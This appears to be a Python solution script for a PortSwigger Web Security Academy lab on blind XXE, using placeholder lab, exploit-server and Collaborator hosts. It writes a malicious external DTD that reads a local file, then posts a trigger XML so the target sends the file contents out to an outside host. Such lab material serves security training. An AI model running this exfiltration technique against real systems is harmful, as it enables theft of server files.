"""
Lab 5: Exploiting blind XXE to exfiltrate data using a malicious external DTD
https://portswigger.net/web-security/xxe/blind/lab-xxe-exfiltrate-data-using-malicious-external-dtd
Difficulty: Practitioner

📝 Two-stage attack:
  1. Host a .dtd file on the exploit server that reads a local file and
     smuggles it into a request to our Collaborator URL as a query param.
  2. Trigger the target to fetch + process that external DTD.

Needs the exploit server AND Collaborator both involved.
"""

from utils import get_session, log, note, build_malicious_external_dtd_file, build_malicious_dtd_trigger

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
STOCK_CHECK_PATH = "/product/stock"
EXPLOIT_SERVER = "https://exploit-YOUR-LAB-ID.exploit-server.net"
COLLABORATOR_URL = "http://YOUR-COLLABORATOR-ID.oastify.com"


def run():
    s = get_session()

    dtd_content = build_malicious_external_dtd_file("exfil", COLLABORATOR_URL)
    out_path = "exploit.dtd"
    with open(out_path, "w") as f:
        f.write(dtd_content)
    log(f"Wrote malicious DTD to {out_path}")
    note(f"Host this at {EXPLOIT_SERVER}/exploit.dtd BEFORE sending the trigger below.")

    trigger_xml = build_malicious_dtd_trigger(f"{EXPLOIT_SERVER}/exploit.dtd")
    note(f"Trigger payload:\n{trigger_xml}")

    r = s.post(f"{TARGET}{STOCK_CHECK_PATH}", data=trigger_xml.encode(),
                headers={"Content-Type": "application/xml"})
    log(f"Response status: {r.status_code}")

    note("Check Burp Collaborator — the interaction's query string will carry")
    note("the exfiltrated file content (e.g. ?exfil=<hostname-contents>).")


if __name__ == "__main__":
    run()
